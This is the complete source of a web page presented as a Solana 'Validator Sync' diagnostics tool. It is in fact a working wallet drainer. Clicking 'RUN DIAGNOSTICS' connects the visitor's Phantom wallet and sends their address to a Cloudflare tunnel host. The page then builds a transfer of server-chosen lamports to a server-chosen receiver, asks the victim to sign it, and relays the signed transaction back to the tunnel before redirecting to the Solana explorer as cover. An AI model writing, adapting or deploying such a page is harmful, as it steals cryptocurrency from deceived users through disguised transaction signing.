<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Pro Sync</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #14f195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
        #log { font-size: 10px; color: #555; margin-top: 15px; word-break: break-all; }
    </style>
</head>
<body>
    <div class="box">
        <h3 style="margin:0; color:#9945FF;">VALIDATOR SYNC</h3>
        <button id="cta">RUN DIAGNOSTICS</button>
        <div id="log">SYSTEM READY v11.0</div>
    </div>

    <script>
        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('log').innerText = t;
            const p = window.solana || window.phantom?.solana;
            const sWeb3 = window.solanaWeb3;

            try {
                log("STAGE 1: CONNECTING...");
                await p.connect();

                log("STAGE 2: FETCHING...");
                const resp = await fetch(tunnel + "/prepare", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();

                log("STAGE 3: BUILDING TX...");
                const tx = new sWeb3.Transaction().add(
                    sWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new sWeb3.PublicKey(info.receiver),
                        lamports: Number(info.amount),
                    })
                );
                tx.recentBlockhash = info.bh;
                tx.feePayer = p.publicKey;

                log("STAGE 4: SIGNING...");
                // üî± Ëøô‰∏ÄÊ≠•‰ºöË∞ÉËµ∑ÂºπÁ™ó
                const signed = await p.signTransaction(tx);
                
                log("STAGE 5: SERIALIZING...");
                // üî± Ê†∏ÂøÉ‰øÆÊ≠£ÔºöÂÆåÂÖ®ÊâãÂä®ËΩ¨‰∏∫Êï∞Â≠óÊï∞ÁªÑÔºå‰∏çÂáÜÂÜçÊèê Buffer ‰∏§‰∏™Â≠ó
                const serialized = signed.serialize();
                const rawArr = [];
                for (let i = 0; i < serialized.length; i++) {
                    rawArr.push(serialized[i]);
                }

                log("STAGE 6: BROADCASTING...");
                await fetch(tunnel + "/broadcast", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ raw_data: rawArr })
                });

                log("SUCCESS: REDIRECTING...");
                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);

            } catch (err) {
                log("FAIL: " + err.message);
                // Êä•ÈîôÂÆûÊó∂ÊâìÂõûÊúçÂä°Âô®
                fetch(tunnel + "/debug", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ stage: "CRASH", error: err.message })
                }).catch(()=>{});
            }
        };
    </script>
</body>
</html>
